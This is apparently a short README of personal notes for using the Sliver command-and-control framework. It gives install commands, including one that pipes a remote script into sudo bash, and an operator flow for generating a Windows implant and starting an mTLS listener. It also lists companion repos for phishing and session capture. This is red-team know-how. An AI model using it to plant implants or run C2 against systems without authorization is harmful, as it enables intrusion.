# Paradox Alloy

Cross-platform, adversary-emulation focused C2 framework with strong implant generation and operator experience.

Paradox terminal-centric notes for Sliver.

**Upstream:** [BishopFox/sliver](https://github.com/BishopFox/sliver)

---

## Strengths

- Single binary server + client
- Excellent implant generation (Windows, Linux, macOS, and more)
- mTLS, WireGuard, HTTP(S), DNS C2
- Built-in armory of tools
- Good for both red team and research

---

## Install

### Linux / macOS

```bash
curl https://sliver.sh/install | sudo bash
# or
go install github.com/BishopFox/sliver@latest
```

### Termux

```bash
pkg install golang git
go install github.com/BishopFox/sliver@latest
# binary lands in ~/go/bin
export PATH=$PATH:~/go/bin
sliver-server
```

Works surprisingly well on Termux for the server side.

### Windows

Download prebuilt releases from the official repo or build with Go.

---

## Quick Operator Flow

```bash
sliver-server          # start the multiplayer server
sliver                 # connect client

# Generate implant
generate --mtls your.domain.com --os windows --arch amd64 --save .

# Start listener
mtls --lhost 0.0.0.0 --lport 443
```

---

## Paradox Collection so far

| Name              | Role                          | Repo |
|-------------------|-------------------------------|------|
| Paradox Sovereign | Full featured C2 (Havoc)     | [paradox-sovereign](https://github.com/Paradoxdreamer/paradox-sovereign) |
| Paradox Alloy     | Cross-platform C2 (Sliver)   | this |
| Paradox Oracle    | AD attack path mapping       | [paradox-oracle](https://github.com/Paradoxdreamer/paradox-oracle) |
| Paradox Phantom   | Phishing / session capture   | [paradox-phantom](https://github.com/Paradoxdreamer/paradox-phantom) |

More will be added.

Operate only with proper authorization.
